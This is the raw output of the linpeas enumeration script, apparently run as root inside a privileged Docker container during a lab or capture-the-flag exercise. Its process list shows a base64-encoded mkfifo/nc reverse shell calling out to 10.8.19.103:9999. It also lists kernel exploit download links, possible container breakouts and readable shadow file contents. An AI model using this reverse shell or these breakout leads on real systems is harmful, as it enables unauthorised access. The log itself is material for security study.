               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-163-generic (buildd@lcy01-amd64-021) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #171-Ubuntu SMP Fri Nov 5 11:55:11 UTC 2021
User & Groups: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
Hostname: 81fbbf1def70
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)n[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-163-generic (buildd@lcy01-amd64-021) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #171-Ubuntu SMP Fri Nov 5 11:55:11 UTC 2021
lsb_release Not Found

╔══════════╣ Sudo version
sudo Not Found

╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin

╔══════════╣ Date & uptime
Sun Jul  9 01:13:16 UTC 2023
 01:13:16 up 29 min,  load average: 0.00, 0.01, 0.33

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev[1;32m/cdrom[0m	/media[1;32m/cdrom[0m	iso9660	noauto,ro 0 0
/dev/usbdisk	/media/usb	vfat	noauto,ro 0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
JAVA_ALPINE_VERSION=8.181.13-r0
HOSTNAME=81fbbf1def70
LD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64
SHLVL=6
OLDPWD=/home
HOME=/root
JAVA_VERSION=8u181
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
LANG=C.UTF-8
HISTSIZE=0
JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
main: line 1918: dpkg: command not found
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled


╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... docker
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No
═╣ Looking and enumerating Docker Sockets
═╣ Docker version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Rootless Docker? ................ No


╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
═╣ Container ID ................... 81fbbf1def70═╣ Container Full ID .............. 81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User proc namespace? ........... enabled
═╣ Vulnerable to CVE-2019-5021 .... No

══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ release_agent breakout 1........ Yes
═╣ release_agent breakout 2........ Yes
═╣ core_pattern breakout .......... Yes
═╣ binfmt_misc breakout ........... No
═╣ uevent_helper breakout ......... Yes
═╣ core_pattern breakout .......... Yes
═╣ is modprobe present ............ lrwxrwxrwx    1 root     root            12 Dec 20  2018 /sbin/modprobe -> /bin/busybox
═╣ DoS via panic_on_oom ........... Yes
═╣ DoS via panic_sys_fs ........... Yes
═╣ DoS via sysreq_trigger_dos ..... Yes
═╣ /proc/config.gz readable ....... No
═╣ /proc/sched_debug readable ..... Yes
═╣ /proc/*/mountinfo readable ..... No
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No

══╣ Namespaces
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces
total 0
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 cgroup -> cgroup:[4026531835]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 ipc -> ipc:[4026532241]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 mnt -> mnt:[4026532239]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 net -> net:[4026532244]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 pid -> pid:[4026532242]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 pid_for_children -> pid:[4026532242]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 user -> user:[4026531837]
lrwxrwxrwx    1 root     root             0 Jul  9 01:13 uts -> uts:[4026532240]

╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
CapInh:	0000003fffffffff
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

╔══════════╣ Privilege Mode
Privilege Mode is enabled

╔══════════╣ Interesting Files Mounted
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/IVRIXPIPTAUXLMA5W6H67HBIQQ:/var/lib/docker/overlay2/l/SQQT6HBAR3TRQG3IBJAXB7TEIU:/var/lib/docker/overlay2/l/NIZU7EGXOSQLBNUX3TPNWZVUN7:/var/lib/docker/overlay2/l/2C3UM7KSHOQFXMNHLV4UKRHUBA:/var/lib/docker/overlay2/l/PVFSC72LOH4QLOHE2N2M6PO3UL:/var/lib/docker/overlay2/l/BPIAR6WYRW3AONIZA2QK75LNX3:/var/lib/docker/overlay2/l/QJ4UCS3NWCXAINAYJMJONR5IRK:/var/lib/docker/overlay2/l/ALNGHDOKRDHGZIU4CJY7VYW5M5:/var/lib/docker/overlay2/l/PW6ZRSVQMA65T2JMYNI3B2N2SI:/var/lib/docker/overlay2/l/JCGLSV7ETSUUDJI2UQEXQBKHAV,upperdir=/var/lib/docker/overlay2/45f5ba1171dd637879f1e304a84acac05fad98331af1c87c495022ecb2f61bca/diff,workdir=/var/lib/docker/overlay2/45f5ba1171dd637879f1e304a84acac05fad98331af1c87c495022ecb2f61bca/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered) [cloudimg-rootfs]
/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,data=ordered) [cloudimg-rootfs]
/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,data=ordered) [cloudimg-rootfs]
cgroup on /tmp/cgroup_3628d4 type cgroup (rw,relatime,memory)

╔══════════╣ Possible Entrypoints
-rwxr-xr-x    1 root     root      808.7K Jul  9 01:13 /tmp/linpeas.sh



                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS Lambda? .......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
PID   USER     TIME  COMMAND
1 root      3:11 java -jar /app/spring-boot-application.jar
24 root      0:00 /bin/bash -c echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA5OTk5ID4vdG1wL2YK | base64 -d | bash
28 root      0:00 bash
31 root      0:00 cat /tmp/f
32 root      0:00 /bin/bash -i
33 root      0:00 nc 10.8.19.103 9999
37 root      0:00 script /dev/null -c bash
38 root      0:00 bash
47 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2506 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2509 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2510 root      0:00 ps fauxwww
2511 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2512 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2513 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2514 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2515 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2516 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2517 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2518 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2519 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2520 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
2521 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly

incrontab Not Found
lrwxrwxrwx    1 root     root            13 Dec 20  2018 /var/spool/cron/crontabs -> /etc/crontabs

/etc/crontabs:
total 12
drwxr-xr-x    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
-rw-------    1 root     root           283 Jun  7  2018 root
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly

# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly

/etc/periodic/:
total 20
drwxr-xr-x    2 root     root          4096 Dec 20  2018 15min
drwxr-xr-x    2 root     root          4096 Dec 20  2018 daily
drwxr-xr-x    2 root     root          4096 Dec 20  2018 hourly
drwxr-xr-x    2 root     root          4096 Dec 20  2018 monthly
drwxr-xr-x    2 root     root          4096 Dec 20  2018 weekly

/etc/periodic/15min:
total 0

/etc/periodic/daily:
total 0

/etc/periodic/hourly:
total 0

/etc/periodic/monthly:
total 0

/etc/periodic/weekly:
total 0

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
busctl Not Found


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
81fbbf1def70
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	81fbbf1def70

nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:687 errors:0 dropped:0 overruns:0 frame:0
          TX packets:530 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:875760 (855.2 KiB)  TX bytes:104087 (101.6 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1/java

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

╔══════════╣ Do I have PGP keys?
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/ash

╔══════════╣ Users with console
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
root:x:0:0:root:/root:/bin/ash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon[0m),3(sys)
uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
uid=11(operator) gid=0(root) groups=0(root)
uid=123(ntp) gid=123(ntp) groups=123(ntp)
uid=13(man) gid=15(man) groups=15(man),15(man)
uid=14(postmaster) gid=12(mail) groups=12(mail)
uid=16(cron) gid=16(cron) groups=16(cron),16(cron)
uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),1(bin),2(daemon[0m),4(adm)
uid=209(smmsp) gid=209(smmsp) groups=209(smmsp),209(smmsp)
uid=21(ftp) gid=21(ftp) groups=21(ftp)
uid=22(sshd) gid=22(sshd) groups=22(sshd)
uid=25(at) gid=25(at) groups=25(at),25(at)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys),4(adm),6(disk)
uid=31(squid) gid=31(squid) groups=31(squid),31(squid)
uid=33(xfs) gid=33(xfs) groups=33(xfs),33(xfs)
uid=35(games) gid=35(games) groups=35(games),100(users)
uid=4(lp) gid=7(lp) groups=7(lp),7(lp)
uid=405(guest) gid=100(users) groups=100(users)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
uid=7(halt) gid=0(root) groups=0(root)
uid=70(postgres) gid=70(postgres) groups=70(postgres)
uid=8(mail) gid=12(mail) groups=12(mail),12(mail)
uid=85(cyrus) gid=12(mail) groups=12(mail)
uid=89(vpopmail) gid=89(vpopmail) groups=89(vpopmail)
uid=9(news) gid=13(news) groups=13(news),13(news)

╔══════════╣ Login now

╔══════════╣ Last logons

╔══════════╣ Last time logon each user

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/bin/base64
/usr/bin/nc
/bin/ping
/usr/bin/wget

╔══════════╣ Installed Compilers


╔══════════╣ Searching ssl/ssh files

╔══════════╣ Searching kerberos conf files and tickets
╚ http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory
ptrace protection is enabled (1), you need to disable it to search for tickets inside processes memory
-rw-r--r--    1 root     root           450 May  1  2018 /etc/krb5.conf
[logging]
# default = FILE:/var/log/krb5libs.log
# kdc = FILE:/var/log/krb5kdc.log
# admin_server = FILE:/var/log/kadmind.log

[libdefaults]
 dns_lookup_realm = false
 ticket_lifetime = 24h
 renew_lifetime = 7d
 forwardable = true
 rdns = false
# default_realm = EXAMPLE.COM

[realms]
# EXAMPLE.COM = {
#  kdc = kerberos.example.com
#  admin_server = kerberos.example.com
# }

[domain_realm]
# .example.com = EXAMPLE.COM
# example.com = EXAMPLE.COM

tickets kerberos Not Found
klist Not Found



╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/passwd




                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x    1 root     root       25.9K May  1  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x    1 root     root       37.9K May  1  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x    1 root     tty        25.8K May  1  2018 /usr/bin/wall

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
CapInh:	0000003fffffffff
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
CapInh:	0000003fffffffff
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path

╔══════════╣ Executable files potentially added by user (limit 70)

╔══════════╣ Unexpected in root
/.dockerenv
/app

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. root:::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. total 8
drwx------    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/root/

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/tmp/hsperfdata_root/1
/tmp/cgroup_3628d4/cgroup.procs
/tmp/cgroup_3628d4/memory.use_hierarchy
/tmp/cgroup_3628d4/memory.kmem.tcp.usage_in_bytes
/tmp/cgroup_3628d4/cgroup.sane_behavior
/tmp/cgroup_3628d4/memory.force_empty
/tmp/cgroup_3628d4/memory.pressure_level
/tmp/cgroup_3628d4/memory.move_charge_at_immigrate
/tmp/cgroup_3628d4/memory.kmem.tcp.max_usage_in_bytes
/tmp/cgroup_3628d4/memory.max_usage_in_bytes
/tmp/cgroup_3628d4/memory.stat
/tmp/cgroup_3628d4/memory.kmem.slabinfo
/tmp/cgroup_3628d4/docker/cgroup.procs
/tmp/cgroup_3628d4/docker/memory.use_hierarchy
/tmp/cgroup_3628d4/docker/memory.kmem.tcp.usage_in_bytes
/tmp/cgroup_3628d4/docker/memory.soft_limit_in_bytes
/tmp/cgroup_3628d4/docker/memory.force_empty
/tmp/cgroup_3628d4/docker/memory.pressure_level
/tmp/cgroup_3628d4/docker/memory.move_charge_at_immigrate
/tmp/cgroup_3628d4/docker/memory.kmem.tcp.max_usage_in_bytes
/tmp/cgroup_3628d4/docker/memory.max_usage_in_bytes
/tmp/cgroup_3628d4/docker/memory.oom_control
/tmp/cgroup_3628d4/docker/memory.stat
/tmp/cgroup_3628d4/docker/memory.kmem.slabinfo
/tmp/cgroup_3628d4/docker/memory.limit_in_bytes
/tmp/cgroup_3628d4/docker/memory.swappiness
/tmp/cgroup_3628d4/docker/memory.numa_stat
/tmp/cgroup_3628d4/docker/memory.kmem.failcnt
/tmp/cgroup_3628d4/docker/memory.kmem.max_usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.procs
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.use_hierarchy
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.soft_limit_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.force_empty
